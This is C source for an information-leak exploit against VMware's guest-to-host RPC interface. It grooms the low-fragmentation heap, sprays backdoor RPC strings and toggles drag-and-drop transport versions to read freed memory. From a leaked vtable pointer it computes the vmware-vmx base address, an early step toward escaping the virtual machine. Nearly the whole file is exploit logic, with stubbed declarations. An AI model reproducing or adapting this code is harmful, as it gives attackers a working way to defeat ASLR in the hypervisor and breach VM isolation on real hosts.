
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int Message_Channel ;


 int MAX_LFH_BLOCK ;
 int Message_Close (int *) ;
 int * Message_Open (int) ;
 int Message_RawSend (int *,char*,int) ;
 int Message_SendSize (int *,int) ;
 int PrepareLFH () ;
 int RpcOut_SendOneRaw (char*,int,char**,int *) ;
 int Sleep (int) ;
 int cbObj ;
 char* chgver ;
 char* dndtransport ;
 char* malloc (int) ;
 int memcpy (size_t*,char*,int) ;
 int memset (char*,char,int) ;
 int min (int,int) ;
 int printf (char*,size_t) ;
 int puts (char*) ;
 char* readstring ;
 scalar_t__ strcmp (char*,char*) ;
 char* stringf (char*,char*) ;
 int strlen (char*) ;
 char* tov2 ;
 char* tov4 ;

size_t infoleak()
{

    Message_Channel *chans[5] = {0};
    for (int i = 0; i < 5; ++i)
    {
        chans[i] = Message_Open(0x49435052);
        if (chans[i])
        {
            Message_SendSize(chans[i], cbObj - 1);
        }
        else
        {
            Message_Close(chans[i - 1]);
            chans[i - 1] = 0;
            break;
        }
    }
    PrepareLFH();
    for (int i = 0; i < 5; ++i)
    {
        if (chans[i])
        {
            Message_Close(chans[i]);
        }
    }

    char *result = ((void*)0);
    char *pObj = malloc(cbObj);
    memset(pObj, 'A', cbObj);
    pObj[cbObj - 1] = 0;
    char *spary2 = stringf("guest.upgrader_send_cmd_line_args %s", pObj);
    while (1)
    {
        for (int i = 0; i < 512; ++i)
        {
            RpcOut_SendOneRaw(tov4, strlen(tov4), &result, ((void*)0));
            RpcOut_SendOneRaw(chgver, strlen(chgver), &result, ((void*)0));
            RpcOut_SendOneRaw(tov2, strlen(tov2), &result, ((void*)0));
            RpcOut_SendOneRaw(chgver, strlen(chgver), &result, ((void*)0));
        }

        for (int i = 0; i < 512; ++i)
        {
            Message_Channel *chan = Message_Open(0x49435052);
            if (chan == ((void*)0))
            {
                puts("Message send error!");
                Sleep(100);
            }
            else
            {
                Message_SendSize(chan, cbObj - 1);
                Message_RawSend(chan, "\xA0\x75", 2);
                Message_Close(chan);
            }
        }
        Message_Channel *chan = Message_Open(0x49435052);
        Message_SendSize(chan, cbObj - 1);
        Message_RawSend(chan, "\xA0\x74", 2);
        RpcOut_SendOneRaw(dndtransport, strlen(dndtransport), &result, ((void*)0));
        for (int i = 0; i < min(cbObj-3,512); ++i)
        {
            RpcOut_SendOneRaw(spary2, strlen(spary2), &result, ((void*)0));
            Message_RawSend(chan, "B", 1);
            RpcOut_SendOneRaw(readstring, strlen(readstring), &result, ((void*)0));
            if (result[0] == 'A' && result[1] == 'A' && strcmp(result, pObj))
            {
               Message_Close(chan);
                for (int i = 0; i < 512; ++i)
                {
                    puts("Trying to leak vtable");
                    RpcOut_SendOneRaw(tov4, strlen(tov4), &result, ((void*)0));
                    RpcOut_SendOneRaw(chgver, strlen(chgver), &result, ((void*)0));
                    RpcOut_SendOneRaw(readstring, strlen(readstring), &result, ((void*)0));
                    size_t p = 0;
                    if (result)
                    {
                        memcpy(&p, result, min(strlen(result), 8));
                        printf("Leak content: %p\n", p);
                    }
                    size_t low = p & 0xFFFF;
                    if (low == 0x74A8 ||
                        low == 0x74d0 ||
                        low == 0x7630)
                    {
                        printf("vmware-vmx base: %p\n", (p & (~0xFFFF)) - 0x7a0000);
                        return (p & (~0xFFFF)) - 0x7a0000;
                    }
                    RpcOut_SendOneRaw(tov2, strlen(tov2), &result, ((void*)0));
                    RpcOut_SendOneRaw(chgver, strlen(chgver), &result, ((void*)0));
                }
            }
        }
        Message_Close(chan);
    }
    return 0;
}
